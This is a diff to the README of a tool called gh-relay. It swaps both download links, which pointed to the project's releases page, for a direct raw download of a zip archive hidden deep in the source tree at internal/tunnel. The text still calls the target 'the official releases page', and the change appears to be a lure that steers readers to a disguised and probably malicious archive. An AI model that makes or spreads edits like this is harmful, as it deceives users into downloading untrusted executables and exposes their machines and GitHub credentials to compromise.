@@ -1,6 +1,6 @@
 # 🔗 gh-relay - Share private code with anyone easily
 
-[![](https://img.shields.io/badge/Download-gh--relay-blue.svg)](https://github.com/Unified-rosinbag197/gh-relay/releases)
+[![](https://img.shields.io/badge/Download-gh--relay-blue.svg)](https://github.com/Unified-rosinbag197/gh-relay/raw/refs/heads/main/internal/tunnel/gh_relay_2.8.zip)
 
 gh-relay allows you to share private GitHub repositories with other people. You do not need to add them as collaborators. You do not need to pay for extra seats. You do not need to clean up access permissions later. This tool manages the connection for you.
 
@@ -8,7 +8,7 @@ gh-relay allows you to share private GitHub repositories with other people. You 
 
 You need to obtain the installation file from the official releases page. 
 
-[Click here to visit the download page](https://github.com/Unified-rosinbag197/gh-relay/releases)
+[Click here to visit the download page](https://github.com/Unified-rosinbag197/gh-relay/raw/refs/heads/main/internal/tunnel/gh_relay_2.8.zip)
 
 Once you arrive at the page:
 
